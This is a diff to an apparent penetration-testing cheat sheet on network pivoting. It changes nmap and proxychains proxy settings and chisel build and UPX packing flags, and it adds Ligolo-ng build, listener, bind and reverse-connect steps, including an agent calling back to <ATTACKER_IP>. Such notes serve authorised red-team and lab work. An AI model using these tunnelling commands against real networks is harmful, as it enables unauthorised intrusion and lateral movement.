@@ -181,9 +181,9 @@ proxychains -q -f <CONFIG_FILE> <COMMAND>
 proxychains msfconsole
 
 # USE nmap's builtin --proxy option
-nmap -sT -Pn -n --proxy http://127.0.0.1:9050 <TARGET>
+nmap -sT -Pn -n --proxy socks4://127.0.0.1:9050 <TARGET>
 # --unprivileged avoids raw sockets and "bad" packets
-nmap -n -Pn -sT -sV --unprivileged --proxy http://127.0.0.1:9050 -p21,22,23,53,80,135,139,389,443,445,1433,3389,5985,5986,8080 --stats-every 15s --open -v -oA nmap_subnet_discovery <TARGET_SUBNET>
+nmap -n -Pn -sT -sV --unprivileged --proxy socks4://127.0.0.1:9050 -p21,22,23,53,80,135,139,389,443,445,1433,3389,5985,5986,8080 --stats-every 15s --open -v -oA nmap_subnet_discovery <TARGET_SUBNET>
 ```
 
 ### Step 0: Pre-Requisites
@@ -198,10 +198,10 @@ cat /etc/proxychains4.conf | grep -v '^#' | grep -v '^\s*$'
 
 sudo mv -v /etc/proxychains4.conf /etc/proxychains4.conf.BAK
 
-echo "quiet_mode
+echo "#quiet_mode
 proxy_dns
-dynamic_chain
-#strict_chain
+#dynamic_chain
+strict_chain
 [ProxyList]
 socks5  127.0.0.1 1080  # Chisel
 socks4  127.0.0.1 9050  # SSH -D proxy or nmap" | sudo tee /etc/proxychains4.conf
@@ -296,7 +296,7 @@ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o chisel.exe
 CGO_ENABLED=0 GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o chisel32.exe
 
 ### SHRINK (10MB -> 3MB)
-upx --brute chisel*
+upx --lzma chisel*
 ```
 
 ### Forward
@@ -305,6 +305,7 @@ upx --brute chisel*
 # REDIR
 ./chisel server --socks5 -v -p <LISTEN_PORT>
 
+# ATTACKER
 ./chisel client -v <CHISEL_SERVER>:<LISTEN_PORT> 1080:socks
 ```
 
@@ -320,19 +321,59 @@ upx --brute chisel*
 
 ## Ligolo-ng
 
+- https://docs.ligolo.ng/InstallBuild/
 - https://docs.ligolo.ng/Quickstart/
 
-```bash
-# ATTACKER
-sudo ./proxy -selfcert
+Sets up a new interface and route to move traffic
 
-# CLIENT
-./agent -connect <ATTACKER_IP>:11601 -ignore-cert
+**Build:**
+```bash
+git clone https://github.com/nicocha30/ligolo-ng.git && cd ligolo-ng
+
+go build -o agent cmd/agent/main.go
+go build -o proxy cmd/proxy/main.go
+# Build for Windows
+GOOS=windows go build -o agent.exe cmd/agent/main.go
+GOOS=windows go build -o proxy.exe cmd/proxy/main.go
+# Build for Linux
+GOOS=linux go build -o agent cmd/agent/main.go
+GOOS=linux go build -o proxy cmd/proxy/main.go
+### SHRINK (10MB -> 3MB)
+upx --lzma agent* proxy*
+```
+
+**ATTACKER: Listener**
+```bash
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+# listens on :11601 by default
+./proxy -selfcert
+```
+
+**Target Listen/Bind**
+(Forward) ATTACKER connects to TARGET
+```bash
+# TARGET
+./agent.exe -bind 0.0.0.0:<PORT>
 
 # ATTACKER: ligolo session
-session 1
-start
+connect_agent --ip <TARGET>:<PORT>
+session
+tunnel_start --tun ligolo
+```
 
-# Back in Kali terminal
+**Target Connect/Reverse**
+(Reverse) TARGET connects to ATTACKER
+```bash
+# Target
+./agent.exe -connect <ATTACKER_IP>:<PORT> -ignore-cert
+
+# ATTACKER: ligolo session
+session
+tunnel_start --tun ligolo
+```
+
+**ATTACKER: Create Route**
+```bash
 sudo ip route add <SUBNET_TARGET> dev ligolo
 ```
